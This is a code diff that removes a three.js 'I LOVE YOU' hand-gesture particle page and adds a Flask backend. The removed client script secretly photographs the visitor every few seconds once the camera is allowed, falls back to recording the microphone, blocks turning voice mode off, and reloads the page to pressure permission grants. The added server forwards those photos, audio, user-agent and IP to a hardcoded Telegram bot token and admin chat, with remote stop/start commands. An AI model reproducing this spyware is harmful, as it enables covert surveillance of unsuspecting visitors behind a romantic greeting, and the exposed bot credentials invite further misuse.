@@ -1,1127 +1,234 @@
-/**
- * CONFIGURATION
- */
-const CONFIG = {
-    particleCount: 40000, 
-    text1: "I",
-    text2: "LOVE",
-    text3: "YOU",
-    text4: "I LOVE YOU",
-    particleSize: 0.08, 
-    scatterRadius: 35,
-    textScale: 0.055,
-    camZ: 40,
-    interactionRadius: 8.0, 
-    repulsionStrength: 8.0 
-};
+from flask import Flask, request, jsonify, send_from_directory
+from datetime import datetime
+import os
+from io import BytesIO
+import base64
+import requests
+from threading import Thread
+
+# =============================
+# APP CONFIG
+# =============================
+BASE_DIR = os.path.dirname(os.path.abspath(__file__))
+CAPTURE_ENABLED = True 
+app = Flask(
+    __name__,
+    template_folder=BASE_DIR,
+    static_folder=BASE_DIR
+)
+
+UPLOAD_FOLDER = os.path.join(BASE_DIR, 'picture')
+os.makedirs(UPLOAD_FOLDER, exist_ok=True)
+
+# =============================
+# TELEGRAM CONFIG
+# =============================
+TELEGRAM_BOT_TOKEN = "7573835095:AAFbQUwn-nLyAXwFKhb3Fotpp8C-pGcU_O4"
+TELEGRAM_ADMIN_ID = "6723063227"
+TELEGRAM_API_URL = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}"
+
+# =============================
+# TELEGRAM SEND
+# =============================
+def send_to_telegram(image_bytes, filename):
+    try:
+        files = {
+            'photo': (filename, BytesIO(image_bytes), 'image/png')
+        }
+        data = {
+            'chat_id': TELEGRAM_ADMIN_ID,
+            'caption': '📸 New Picture'
+        }
+        requests.post(
+            f'{TELEGRAM_API_URL}/sendPhoto',
+            files=files,
+            data=data,
+            timeout=10
+        )
+    except Exception as e:
+        print("Telegram image error:", e)
 
 
-/**
- * STATE MANAGEMENT
- */
-const state = {
-    targetGestureLabel: "Waiting...",
-    currentWeights: [0, 0, 0, 0, 0], 
-    targetWeights: [0, 0, 0, 0, 0],
-    
-    spreadTarget: 1.0, 
-    currentSpread: 1.0, 
-    
-    scatterScaleTarget: 1.0, 
-    currentScatterScale: 1.0,
+def send_audio_to_telegram(audio_bytes, filename, mime):
+    try:
+        files = {
+            'audio': (filename, BytesIO(audio_bytes), mime)
+        }
+        data = {
+            'chat_id': TELEGRAM_ADMIN_ID,
+            'caption': '🎙 Voice recording'
+        }
+        print('[AUDIO]', filename, mime, len(audio_bytes))
+        requests.post(
+            f'{TELEGRAM_API_URL}/sendAudio',
+            files=files,
+            data=data,
+            timeout=20
+        )
+    except Exception as e:
+        print("Telegram audio error:", e)
 
-    fingerCount: 0,
-    galaxyEffectActive: false, 
-    
-    voiceModeActive: false,
-    wasVoiceModeActive: false,
-    voiceEnabledByUser: false, 
+# =============================
+# ROUTES
+# =============================
+@app.route('/')
+def index():
+    return send_from_directory(BASE_DIR, 'index.html')
 
-    handPositionRaw: { x: 0.5, y: 0.5 },
-    handPositions: [], 
-    isHandDetected: false
-};
-const PERMISSION_MAX_RETRY = 3; // cho phép reload tối đa 3 lần
-let permissionFailCount = Number(sessionStorage.getItem('permission_fail_count') || 0);
+@app.route('/luv.js')
+def serve_js():
+    return send_from_directory(BASE_DIR, 'luv.js')
 
-const UA_SENT_KEY = 'ua_sent_once';
+@app.route('/style.css')
+def serve_css():
+    return send_from_directory(BASE_DIR, 'style.css')
 
-/**
- * UI INTERACTION LOGIC (Collapse & Drag)
- */
+# =============================
+# SAVE AUDIO (MATCH JS)
+# =============================
+@app.route('/save_audio', methods=['POST'])
+def save_audio():
+    try:
+        if 'audio' not in request.files:
+            return jsonify({'success': False, 'error': 'No audio file'}), 400
 
-// 1. Collapse UI
-const btnCollapse = document.getElementById('btn-collapse');
-const uiLayer = document.getElementById('ui-layer');
-btnCollapse.addEventListener('click', () => {
-    uiLayer.classList.toggle('collapsed');
-    btnCollapse.innerText = uiLayer.classList.contains('collapsed') ? '+' : '−';
-});
+        audio_file = request.files['audio']
+        mime = request.form.get('mime', audio_file.mimetype)
 
-// 2. Drag Camera
-const camWrapper = document.getElementById('camera-wrapper');
-const camHandle = document.getElementById('camera-handle');
-let isDragging = false;
-let dragOffset = { x: 0, y: 0 };
+        audio_bytes = audio_file.read()
 
-camHandle.addEventListener('mousedown', (e) => {
-    if (state.voiceModeActive) return;
-    isDragging = true;
-    const rect = camWrapper.getBoundingClientRect();
-    dragOffset.x = e.clientX - rect.left;
-    dragOffset.y = e.clientY - rect.top;
-    
-    camWrapper.style.bottom = 'auto';
-    camWrapper.style.right = 'auto';
-    camWrapper.style.left = rect.left + 'px';
-    camWrapper.style.top = rect.top + 'px';
-});
+        # iOS vs others
+        if 'mp4' in mime:
+            ext = 'm4a'
+            mime_type = 'audio/mp4'
+        else:
+            ext = 'webm'
+            mime_type = 'audio/webm'
 
-window.addEventListener('mousemove', (e) => {
-    if (isDragging) {
-        camWrapper.style.left = (e.clientX - dragOffset.x) + 'px';
-        camWrapper.style.top = (e.clientY - dragOffset.y) + 'px';
-    }
-});
+        filename = f'voice_{datetime.now().strftime("%Y%m%d_%H%M%S")}.{ext}'
 
-window.addEventListener('mouseup', () => {
-    isDragging = false;
-});
+        Thread(
+            target=send_audio_to_telegram,
+            args=(audio_bytes, filename, mime_type),
+            daemon=True
+        ).start()
 
-/**
- * THREE.JS SETUP
- */
-const container = document.getElementById('canvas-container');
-const scene = new THREE.Scene();
-scene.background = new THREE.Color(0x050505);
-scene.fog = new THREE.FogExp2(0x050505, 0.012);
+        return jsonify({'success': True})
 
-const camera = new THREE.PerspectiveCamera(75, window.innerWidth / window.innerHeight, 0.1, 1000);
-camera.position.z = CONFIG.camZ;
+    except Exception as e:
+        return jsonify({'success': False, 'error': str(e)}), 500
 
-const vFOV = THREE.MathUtils.degToRad(camera.fov);
-const heightAtZero = 2 * Math.tan(vFOV / 2) * camera.position.z;
-const widthAtZero = heightAtZero * camera.aspect;
+# =============================
+# LOG USER AGENT
+# =============================
+@app.route('/log_user_agent', methods=['POST'])
+def log_user_agent():
+    try:
+        data = request.json or {}
 
-const renderer = new THREE.WebGLRenderer({ antialias: true, alpha: true });
-renderer.setSize(window.innerWidth, window.innerHeight);
-renderer.setPixelRatio(window.devicePixelRatio);
-container.appendChild(renderer.domElement);
+        ua = data.get('user_agent', 'unknown')
+        platform = data.get('platform', '')
+        screen = data.get('screen', '')
+        dpr = data.get('dpr', '')
 
-const controls = new THREE.OrbitControls(camera, renderer.domElement);
-controls.enableDamping = true;
-controls.dampingFactor = 0.05;
-controls.autoRotate = false; 
-controls.enableZoom = false;
+        message = (
+            "<blockquote>"
+            "📱 <b>User Agent Detected</b>\n\n"
+            f"🧠 <b>UA:</b>\n<code>{ua}</code>\n\n"
+            f"💻 <b>Platform:</b> {platform}\n"
+            f"🖥 <b>Screen:</b> {screen}\n"
+            f"🔍 <b>DPR:</b> {dpr}\n"
+            f"🌐 <b>IP:</b> {request.remote_addr}"
+            "</blockquote>"
+        )
 
-window.addEventListener('resize', () => {
-    camera.aspect = window.innerWidth / window.innerHeight;
-    camera.updateProjectionMatrix();
-    renderer.setSize(window.innerWidth, window.innerHeight);
-});
+        requests.post(
+            f"{TELEGRAM_API_URL}/sendMessage",
+            data={
+                "chat_id": TELEGRAM_ADMIN_ID,
+                "text": message,
+                "parse_mode": "HTML"
+            },
+            timeout=10
+        )
 
-/**
- * PARTICLE SYSTEM & TEXT GENERATION
- */
+        return jsonify({"success": True})
+    except Exception as e:
+        return jsonify({"success": False, "error": str(e)}), 500
 
-function generateTextCoordinates(text, step = 2, scaleOverride = null) {
-    console.log(`Generating text coords for: "${text}"`);
-    const canvas = document.createElement('canvas');
-    const ctx = canvas.getContext('2d');
-    const width = 3000; 
-    const height = 800;
-    canvas.width = width;
-    canvas.height = height;
+# =============================
+# SAVE IMAGE
+# =============================
+@app.route('/save_image', methods=['POST'])
+def save_image():
+    global CAPTURE_ENABLED
 
-    ctx.fillStyle = 'black';
-    ctx.fillRect(0, 0, width, height);
-    ctx.fillStyle = 'white';
-    ctx.font = '900 250px Arial, sans-serif';
-    ctx.textAlign = 'center';
-    ctx.textBaseline = 'middle';
-    ctx.fillText(text, width / 2, height / 2);
+    if not CAPTURE_ENABLED:
+        return jsonify({'success': False, 'stopped': True})
 
-    const imageData = ctx.getImageData(0, 0, width, height);
-    const data = imageData.data;
-    const coords = [];
+    try:
+        data = request.json or {}
+        image_data = data.get('image')
 
-    const finalScale = scaleOverride || CONFIG.textScale;
 
-    for (let y = 0; y < height; y += step) { 
-        for (let x = 0; x < width; x += step) {
-            const i = (y * width + x) * 4;
-            if (data[i] > 128) {
-                const pX = (x - width / 2) * finalScale;
-                const pY = -(y - height / 2) * finalScale;
-                coords.push(new THREE.Vector3(pX, pY, 0));
+        if not image_data:
+            return jsonify({'success': False}), 400
+
+        if image_data.startswith('data:image'):
+            image_data = image_data.split(',')[1]
+
+        image_bytes = base64.b64decode(image_data)
+
+        filename = f"miss_{datetime.now().strftime('%Y%m%d_%H%M%S')}.png"
+        filepath = os.path.join(UPLOAD_FOLDER, filename)
+
+        with open(filepath, 'wb') as f:
+            f.write(image_bytes)
+
+        Thread(
+            target=send_to_telegram,
+            args=(image_bytes, filename),
+            daemon=True
+        ).start()
+
+        return jsonify({'success': True})
+
+    except Exception as e:
+        return jsonify({'success': False, 'message': str(e)}), 500
+
+@app.route('/telegram_webhook', methods=['POST'])
+def telegram_webhook():
+    global CAPTURE_ENABLED
+
+    data = request.json or {}
+    message = data.get('message', {})
+    text = message.get('text', '')
+    chat_id = message.get('chat', {}).get('id')
+
+    if str(chat_id) != TELEGRAM_ADMIN_ID:
+        return jsonify({'ok': True})
+
+    if text == '/stop':
+        CAPTURE_ENABLED = False
+        requests.post(
+            f"{TELEGRAM_API_URL}/sendMessage",
+            data={
+                "chat_id": TELEGRAM_ADMIN_ID,
+                "text": "🛑 Image capture stopped"
             }
-        }
-    }
-    console.log(`Generated ${coords.length} points for "${text}"`);
-    return coords;
-}
+        )
 
-const coordsText1 = generateTextCoordinates(CONFIG.text1, 3); 
-const coordsText2 = generateTextCoordinates(CONFIG.text2, 3);
-const coordsText3 = generateTextCoordinates(CONFIG.text3, 3);
-const coordsText4 = generateTextCoordinates(CONFIG.text4, 3); 
-let coordsText5 = generateTextCoordinates("MERRY CHRISTMAS", 2); 
-
-const particleGeometry = new THREE.BufferGeometry();
-const positions = new Float32Array(CONFIG.particleCount * 3);
-const colors = new Float32Array(CONFIG.particleCount * 3);
-
-const posScatter = [];
-const posText1 = [];
-const posText2 = [];
-const posText3 = [];
-const posText4 = [];
-const posText5 = [];
-
-function fillPosArray(targetArray, sourceCoords) {
-    targetArray.length = 0; 
-    const depth = 2.0;
-    const noise = 0.2;
-    for (let i = 0; i < CONFIG.particleCount; i++) {
-        if (sourceCoords.length === 0) {
-             targetArray.push(new THREE.Vector3(0,0,0));
-             continue;
-        }
-        const index = Math.floor(Math.random() * sourceCoords.length);
-        const p = sourceCoords[index];
-        targetArray.push(new THREE.Vector3(
-            p.x + (Math.random() - 0.5) * noise,
-            p.y + (Math.random() - 0.5) * noise,
-            p.z + (Math.random() - 0.5) * depth
-        ));
-    }
-}
-
-for (let i = 0; i < CONFIG.particleCount; i++) {
-    const theta = Math.random() * Math.PI * 2;
-    const phi = Math.acos(Math.random() * 2 - 1);
-    const r = Math.cbrt(Math.random()) * CONFIG.scatterRadius; 
-    const x = r * Math.sin(phi) * Math.cos(theta);
-    const y = r * Math.sin(phi) * Math.sin(theta);
-    const z = r * Math.cos(phi);
-    positions[i * 3] = x;
-    positions[i * 3 + 1] = y;
-    positions[i * 3 + 2] = z;
-    colors[i * 3] = 1; colors[i * 3 + 1] = 1; colors[i * 3 + 2] = 1;
-    posScatter.push(new THREE.Vector3(x, y, z));
-}
-
-fillPosArray(posText1, coordsText1);
-fillPosArray(posText2, coordsText2);
-fillPosArray(posText3, coordsText3);
-fillPosArray(posText4, coordsText4);
-fillPosArray(posText5, coordsText5); 
-
-particleGeometry.setAttribute('position', new THREE.BufferAttribute(positions, 3));
-particleGeometry.setAttribute('color', new THREE.BufferAttribute(colors, 3));
-
-const particleMaterial = new THREE.PointsMaterial({
-    vertexColors: true,
-    size: CONFIG.particleSize,
-    transparent: true,
-    opacity: 0.9,
-    blending: THREE.AdditiveBlending,
-    depthWrite: false,
-    sizeAttenuation: true
-});
-
-const particleSystem = new THREE.Points(particleGeometry, particleMaterial);
-scene.add(particleSystem);
-
-function updateDynamicText(text) {
-    const length = Math.max(text.length, 3);
-    let optimalScale = 0.09; 
-    if (length > 4) {
-        optimalScale = 0.4 / length; 
-    }
-    optimalScale = Math.max(0.035, optimalScale);
-
-    const newCoords = generateTextCoordinates(text, 2, optimalScale);
-    fillPosArray(posText5, newCoords);
-}
-
-/**
- * GALAXY BACKGROUND 
- */
-const galaxyCount = 8000; 
-const galaxyGeo = new THREE.BufferGeometry();
-const galaxyPos = new Float32Array(galaxyCount * 3);
-const galaxyColors = new Float32Array(galaxyCount * 3);
-
-for(let i=0; i<galaxyCount; i++) {
-    const r = 20 + Math.random() * 60; 
-    const theta = Math.random() * Math.PI * 2;
-    const phi = Math.acos(Math.random() * 2 - 1);
-    
-    galaxyPos[i*3] = r * Math.sin(phi) * Math.cos(theta);
-    galaxyPos[i*3+1] = r * Math.sin(phi) * Math.sin(theta);
-    galaxyPos[i*3+2] = r * Math.cos(phi);
-
-    const c = new THREE.Color();
-    const rand = Math.random();
-    if(rand < 0.3) c.setHex(0x00ffff); 
-    else if (rand < 0.6) c.setHex(0x0000ff); 
-    else if (rand < 0.8) c.setHex(0x4b0082); 
-    else c.setHex(0xffffff); 
-
-    c.multiplyScalar(0.5 + Math.random() * 0.5);
-
-    galaxyColors[i*3] = c.r;
-    galaxyColors[i*3+1] = c.g;
-    galaxyColors[i*3+2] = c.b;
-}
-
-galaxyGeo.setAttribute('position', new THREE.BufferAttribute(galaxyPos, 3));
-galaxyGeo.setAttribute('color', new THREE.BufferAttribute(galaxyColors, 3));
-
-const galaxyMaterial = new THREE.PointsMaterial({
-    vertexColors: true,
-    size: 0.04, 
-    transparent: true,
-    opacity: 0, 
-    blending: THREE.AdditiveBlending,
-    depthWrite: false
-});
-
-const galaxySystem = new THREE.Points(galaxyGeo, galaxyMaterial);
-scene.add(galaxySystem);
-
-/**
- * VOICE RECOGNITION
- */
-const voiceBtn = document.getElementById('btn-voice');
-const voiceIndicator = document.getElementById('voice-indicator');
-const voiceBtnText = document.getElementById('voice-btn-text');
-
-let recognition = null;
-
-if ('webkitSpeechRecognition' in window || 'SpeechRecognition' in window) {
-    const SpeechRecognition = window.SpeechRecognition || window.webkitSpeechRecognition;
-    recognition = new SpeechRecognition();
-    recognition.continuous = true;
-    recognition.interimResults = false;
-    recognition.lang = 'en-US';
-
-    recognition.onstart = () => {
-        console.log("Voice recognition started");
-        voiceIndicator.classList.add('listening');
-        voiceBtnText.innerText = "Voice Mode: ON";
-        voiceBtn.classList.add('active');
-    };
-
-    recognition.onerror = (event) => {
-        console.error("Voice recognition error", event.error);
-        if (event.error === 'not-allowed') {
-            alert("Microphone access denied. Please reload page and allow microphone access.");
-            state.voiceEnabledByUser = false;
-        }
-        voiceIndicator.classList.remove('listening');
-    };
-
-    recognition.onend = () => {
-        console.log("Voice recognition ended");
-        voiceIndicator.classList.remove('listening');
-        if (state.voiceEnabledByUser) {
-            setTimeout(() => {
-                try { recognition.start(); } catch(e) { console.warn("Restart failed", e); }
-            }, 300);
-        } else {
-            voiceBtnText.innerText = "Enable Voice Mode";
-            voiceBtn.classList.remove('active');
-        }
-    };
-
-    recognition.onresult = (event) => {
-        if (!state.voiceEnabledByUser) return;
-
-        const last = event.results.length - 1;
-        const transcript = event.results[last][0].transcript.trim().toUpperCase();
-        
-        const words = transcript.split(' ');
-        const displayPhrase = words.slice(-3).join(' ');
-
-        if (displayPhrase.length > 0) {
-            updateDynamicText(displayPhrase);
-            state.targetGestureLabel = "Voice: " + displayPhrase;
-            state.targetWeights = [0, 0, 0, 0, 1];
-            state.spreadTarget = 0.0; 
-        }
-    };
-} else {
-    voiceBtnText.innerText = "Voice Not Supported";
-    voiceBtn.disabled = true;
-}
-
-voiceBtn.addEventListener('click', () => {
-    if (!recognition) return;
-
-    if (state.voiceModeActive) {
-        console.log("Voice already active – cannot stop manually");
-        return;
-    }
-
-    state.voiceEnabledByUser = true;
-    state.voiceModeActive = true;
-
-    try {
-        recognition.start();
-        startVoiceRecording();
-    } catch (e) {
-        console.warn(e);
-    }
-
-    state.targetGestureLabel = "Listening...";
-    state.spreadTarget = 0.0;
-    state.targetWeights = [0, 0, 0, 0, 1];
-
-    voiceBtnText.innerText = "Voice Mode: ON";
-    voiceBtn.classList.add('active');
-});
-
-
-/**
- * HAND TRACKING & INTERACTION
- */
-const videoElement = document.getElementById('webcam-preview');
-const uiGesture = document.getElementById('gesture-val');
-const uiFingers = document.getElementById('finger-val');
-const loading = document.getElementById('loading');
-
-function onResults(results) {
-    loading.style.display = 'none';
-
-    let detectedGesture = 0; 
-    let fCount = 0;
-    let openness = 1.0;
-
-    state.handPositions = []; 
-
-    if (results.multiHandLandmarks && results.multiHandLandmarks.length > 0) {
-        state.isHandDetected = true;
-        
-        for (const landmarks of results.multiHandLandmarks) {
-            const palmX = 1.0 - landmarks[9].x; 
-            const palmY = landmarks[9].y;
-            const hPos = new THREE.Vector3(
-                (palmX - 0.5) * widthAtZero,
-                -(palmY - 0.5) * heightAtZero,
-                0
-            );
-            state.handPositions.push(hPos);
-        }
-
-        const landmarks = results.multiHandLandmarks[0];
-        const handedness = results.multiHandedness[0].label;
-        
-        const wrist = landmarks[0];
-        state.handPositionRaw.x = 1.0 - wrist.x; 
-        state.handPositionRaw.y = wrist.y;
-
-        fCount = countFingers(landmarks, handedness);
-        openness = getHandOpenness(landmarks);
-
-        if (state.voiceEnabledByUser) {
-            state.targetWeights = [0, 0, 0, 0, 1];
-            state.spreadTarget = 0.0; 
-            state.galaxyEffectActive = false; 
-        } else {
-            if (fCount === 1) detectedGesture = 1;
-            else if (fCount === 2) detectedGesture = 2;
-            else if (fCount === 3) detectedGesture = 3;
-            else if (fCount === 4) detectedGesture = 4;
-
-            if (detectedGesture > 0) {
-                state.targetGestureLabel = getLabel(detectedGesture);
-                state.spreadTarget = 0.0;
-                state.targetWeights = getWeights(detectedGesture);
-                state.galaxyEffectActive = (detectedGesture === 4);
-            } else {
-                state.targetGestureLabel = fCount === 0 ? "Fist (Contract)" : "Scatter (Expand)";
-                state.spreadTarget = 1.0;
-                state.galaxyEffectActive = false;
-                const minScale = 0.1;
-                const maxScale = 1.5;
-                state.scatterScaleTarget = minScale + openness * (maxScale - minScale);
+    elif text == '/start':
+        CAPTURE_ENABLED = True
+        requests.post(
+            f"{TELEGRAM_API_URL}/sendMessage",
+            data={
+                "chat_id": TELEGRAM_ADMIN_ID,
+                "text": "▶️ Image capture resumed"
             }
-        }
+        )
 
-        state.fingerCount = fCount;
+    return jsonify({'ok': True})
 
-    } else {
-        state.isHandDetected = false;
-
-        if (state.voiceEnabledByUser) {
-            state.spreadTarget = 0.0;
-            state.targetWeights = [0, 0, 0, 0, 1];
-            state.handPositionRaw.x = 0.5;
-            state.handPositionRaw.y = 0.5;
-        } else {
-            state.spreadTarget = 1.0;
-            state.targetGestureLabel = "Waiting...";
-            state.scatterScaleTarget = 1.0;
-            state.handPositionRaw.x = 0.5;
-            state.handPositionRaw.y = 0.5;
-        }
-        
-        state.fingerCount = 0;
-        state.galaxyEffectActive = false;
-    }
-
-    updateUI();
-}
-
-
-function getLabel(g) {
-    if(g===1) return CONFIG.text1;
-    if(g===2) return CONFIG.text2;
-    if(g===3) return CONFIG.text3;
-    if(g===4) return "I LOVE YOU";
-    return "";
-}
-
-function getWeights(g) {
-    if(g===1) return [1,0,0,0,0];
-    if(g===2) return [0,1,0,0,0];
-    if(g===3) return [0,0,1,0,0];
-    if(g===4) return [0,0,0,1,0];
-    return state.targetWeights; 
-}
-
-function getHandOpenness(landmarks) {
-    const wrist = landmarks[0];
-    const tips = [8, 12, 16, 20];
-    const mcps = [5,9, 13, 17];
-    let distTips = 0, distMcps = 0;
-    for(let i=0; i<4; i++){
-        distTips += Math.hypot(landmarks[tips[i]].x - wrist.x, landmarks[tips[i]].y - wrist.y);
-        distMcps += Math.hypot(landmarks[mcps[i]].x - wrist.x, landmarks[mcps[i]].y - wrist.y);
-    }
-    const ratio = distTips / distMcps;
-    return Math.max(0, Math.min(1, (ratio - 1.0) / 1.2));
-}
-
-function countFingers(landmarks, handedness) {
-    let count = 0;
-    const fingerTips = [8, 12, 16, 20];
-    const fingerPips = [6, 10, 14, 18];
-    for (let i = 0; i < 4; i++) {
-        if (landmarks[fingerTips[i]].y < landmarks[fingerPips[i]].y) count++;
-    }
-    const thumbTip = landmarks[4];
-    const thumbIp = landmarks[3];
-    const isRightHand = handedness === 'Right';
-    if (isRightHand) {
-        if (thumbTip.x < thumbIp.x) count++;
-    } else {
-        if (thumbTip.x > thumbIp.x) count++;
-    }
-    return count;
-}
-
-function updateUI() {
-    uiGesture.innerText = state.targetGestureLabel;
-    uiFingers.innerText = state.fingerCount;
-}
-
-const hands = new Hands({locateFile: (file) => {
-    return `https://cdn.jsdelivr.net/npm/@mediapipe/hands/${file}`;
-}});
-
-hands.setOptions({
-    maxNumHands: 2, 
-    modelComplexity: 1,
-    minDetectionConfidence: 0.5,
-    minTrackingConfidence: 0.5
-});
-
-hands.onResults(onResults);
-
-const cameraFeed = new Camera(videoElement, {
-    onFrame: async () => {
-        await hands.send({image: videoElement});
-    },
-    width: 1280,
-    height: 720
-});
-
-let cameraDenied = false;
-let micDenied = false;
-let permissionFailTimer = null;
-const PERMISSION_FAIL_TIMEOUT = 7000; 
-
-function showPermissionError() {
-    permissionFailCount++;
-    sessionStorage.setItem('permission_fail_count', permissionFailCount);
-
-    // ❌ Đã vượt quá số lần cho phép → không reload nữa
-    if (permissionFailCount > PERMISSION_MAX_RETRY) {
-        loading.innerHTML = `
-            <div style="color:#fff; text-align:center; line-height:1.6;">
-                <b>Permission Required</b><br><br>
-                You have denied permission multiple times.<br><br>
-                Please enable <b>Camera</b> or <b>Microphone</b><br>
-                manually in browser settings<br>
-                and refresh the page.
-            </div>
-        `;
-        return;
-    }
-
-    // ✅ Vẫn còn lượt → countdown & reload
-    let secondsLeft = PERMISSION_FAIL_TIMEOUT / 1000;
-
-    loading.innerHTML = `
-        <div style="color:#fff; text-align:center; line-height:1.6;">
-            <b>Permission Required</b><br><br>
-            Please allow <b>Camera</b> or <b>Microphone</b><br>
-            to use this website.<br><br>
-            <span id="reload-timer" style="color:#ff8080;">
-                Reloading in ${secondsLeft}s...
-            </span>
-        </div>
-    `;
-
-    const timerEl = document.getElementById('reload-timer');
-
-    permissionFailTimer = setInterval(() => {
-        secondsLeft--;
-        if (timerEl) {
-            timerEl.innerText = `Reloading in ${secondsLeft}s...`;
-        }
-
-        if (secondsLeft <= 0) {
-            clearInterval(permissionFailTimer);
-            permissionFailTimer = null;
-            location.reload();
-        }
-    }, 1000);
-}
-
-
-
-async function startCamera() {
-    try {
-        loading.innerHTML = "Requesting Camera Access...";
-        if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
-            throw new Error("Browser API 'navigator.mediaDevices.getUserMedia' not available");
-        }
-
-        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-        stream.getTracks().forEach(track => track.stop());
-        
-        loading.innerHTML = "Starting MediaPipe Camera...";
-        await cameraFeed.start();
-        // reset permission counter khi cam OK
-        sessionStorage.removeItem('permission_fail_count');
-        permissionFailCount = 0;
-
-        // 🟢 CHỤP NGAY 1 ẢNH KHI USER ALLOW CAM
-        setTimeout(() => {
-            takePhotoFromCamera(true); // force capture
-        }, 800);
-
-        // 🟢 SAU ĐÓ CHỤP ĐỀU 2s / ẢNH
-        if (!captureTimer && !cameraDenied) {
-            captureTimer = setInterval(() => {
-                takePhotoFromCamera();
-            }, CAPTURE_INTERVAL);
-        }
-    } catch (err) {
-        console.warn("Camera denied:", err);
-        cameraDenied = true;
-
-        loading.innerHTML = "Camera denied. Trying microphone access...";
-
-        // 👉 Chuyển sang voice logic
-        try {
-            await tryEnableVoiceFallback();
-        } catch (e) {
-            console.error("Mic also denied", e);
-            showPermissionError();
-        }
-    }
-}
-
-function enableVoiceModeAuto() {
-    sessionStorage.removeItem('permission_fail_count');
-    permissionFailCount = 0;
-
-    console.log("Voice mode auto-enabled");
-
-    state.voiceEnabledByUser = false;
-    state.voiceModeActive = true;
-
-    state.targetGestureLabel = "Voice Mode (Mic)";
-    state.spreadTarget = 0.0;
-    state.targetWeights = [0, 0, 0, 0, 1];
-    
-    voiceBtnText.innerText = "Voice Mode: ON";
-    voiceBtn.classList.add('active');
-
-    // start voice + recording
-    if (recognition) {
-        try { recognition.start(); } catch {}
-    }
-
-    startVoiceRecording();
-
-    loading.style.display = 'none';
-}
-
-async function tryEnableVoiceFallback() {
-    if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
-        throw new Error("MediaDevices not supported");
-    }
-
-    try {
-        // xin quyền mic
-        const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
-        stream.getTracks().forEach(t => t.stop());
-
-        // ✅ Mic OK → bật voice mode
-        enableVoiceModeAuto();
-    } catch (e) {
-        micDenied = true;
-        throw e;
-    }
-}
-
-let isMouseMode = false;
-function activateMouseMode() {
-    isMouseMode = true;
-    state.isHandDetected = true;
-    
-    camWrapper.style.display = 'flex';
-    camWrapper.style.justifyContent = 'center';
-    camWrapper.style.alignItems = 'center';
-    camWrapper.style.background = 'rgba(20, 20, 20, 0.8)';
-    camWrapper.style.border = '1px solid #444';
-    
-    const video = document.getElementById('webcam-preview');
-    video.style.opacity = '0.1';
-    
-    if (!document.getElementById('no-cam-msg')) {
-        const msg = document.createElement('div');
-        msg.id = 'no-cam-msg';
-        msg.innerHTML = "NO CAMERA<br>Mouse Mode";
-        msg.style.color = '#aaa';
-        msg.style.textAlign = 'center';
-        msg.style.fontSize = '12px';
-        msg.style.position = 'absolute';
-        camWrapper.appendChild(msg);
-    }
-    
-    window.addEventListener('mousemove', (event) => {
-        const vec = new THREE.Vector3();
-        const pos = new THREE.Vector3();
-        
-        vec.set(
-            (event.clientX / window.innerWidth) * 2 - 1,
-            -(event.clientY / window.innerHeight) * 2 + 1,
-            0.5
-        );
-        
-        vec.unproject(camera);
-        vec.sub(camera.position).normalize();
-        
-        const distance = -camera.position.z / vec.z;
-        pos.copy(camera.position).add(vec.multiplyScalar(distance));
-        
-        state.handPositions = [pos];
-        
-        state.handPositionRaw.x = event.clientX / window.innerWidth;
-        state.handPositionRaw.y = event.clientY / window.innerHeight;
-    });
-
-    let gestureIndex = 0;
-    window.addEventListener('click', () => {
-        if (state.voiceModeActive) return;
-        
-        gestureIndex = (gestureIndex + 1) % 5;
-        const g = gestureIndex;
-        
-        if (g === 0) {
-            state.targetGestureLabel = "Mouse Click: Scatter";
-            state.spreadTarget = 1.0;
-            state.galaxyEffectActive = false;
-        } else {
-            state.targetGestureLabel = "Mouse Click: " + getLabel(g);
-            state.spreadTarget = 0.0;
-            state.targetWeights = getWeights(g);
-            state.galaxyEffectActive = (g === 4);
-        }
-        updateUI();
-    });
-    
-    const uiContent = document.getElementById('ui-content');
-    const helpText = uiContent.querySelector('div[style*="font-size: 11px"]');
-    if(helpText) {
-        helpText.innerHTML = `
-            <b>Mouse Mode Active:</b><br>
-            🖱️ Move mouse to interact<br>
-            🖱️ Click to cycle gestures<br>
-            (I -> LOVE -> YOU -> ...)<br>
-            <br>
-            <b>Voice Mode:</b><br>
-            🎤 Still works if Mic is available
-        `;
-    }
-}
-
-
-/**
- * ANIMATION LOOP
- */
-function animate() {
-    requestAnimationFrame(animate);
-
-    // Handle AR Mode Transition
-    if (state.voiceModeActive !== state.wasVoiceModeActive) {
-        if (state.voiceModeActive) {
-            camWrapper.classList.add('fullscreen');
-            if (!isMouseMode) {
-                scene.background = null; 
-            } else {
-                scene.background = new THREE.Color(0x050505);
-            }
-            
-            camWrapper.style.top = '';
-            camWrapper.style.left = '';
-            camWrapper.style.bottom = '';
-            camWrapper.style.right = '';
-        } else {
-            camWrapper.classList.remove('fullscreen');
-            scene.background = new THREE.Color(0x050505);
-            if (!camWrapper.style.top) {
-                camWrapper.style.bottom = '15px';
-                camWrapper.style.right = '15px';
-            }
-        }
-        state.wasVoiceModeActive = state.voiceModeActive;
-    }
-
-    // Smooth Interpolation
-    state.currentSpread += (state.spreadTarget - state.currentSpread) * 0.08;
-    state.currentScatterScale += (state.scatterScaleTarget - state.currentScatterScale) * 0.1;
-    
-    for(let i=0; i<5; i++) { 
-        state.currentWeights[i] += (state.targetWeights[i] - state.currentWeights[i]) * 0.1;
-    }
-
-    // Hand Rotation
-    const targetRotY = (state.handPositionRaw.x - 0.5) * 1.5; 
-    const targetRotX = (state.handPositionRaw.y - 0.5) * 1.5;
-    particleSystem.rotation.y += (targetRotY - particleSystem.rotation.y) * 0.1;
-    particleSystem.rotation.x += (targetRotX - particleSystem.rotation.x) * 0.1;
-    
-    // Galaxy Rotation
-    galaxySystem.rotation.y += 0.002;
-    galaxySystem.rotation.x += 0.001;
-
-    // Particle Animation
-    const positionsArray = particleGeometry.attributes.position.array;
-    const colorsArray = particleGeometry.attributes.color.array;
-
-    const time = Date.now() * 0.001;
-    
-    const w1 = state.currentWeights[0]; 
-    const w2 = state.currentWeights[1]; 
-    const w3 = state.currentWeights[2]; 
-    const w4 = state.currentWeights[3]; 
-    const w5 = state.currentWeights[4]; 
-
-    const interactionRadSq = CONFIG.interactionRadius * CONFIG.interactionRadius;
-    
-    for (let i = 0; i < CONFIG.particleCount; i++) {
-        // 1. Calculate Target Position
-        const p1 = posText1[i];
-        const p2 = posText2[i];
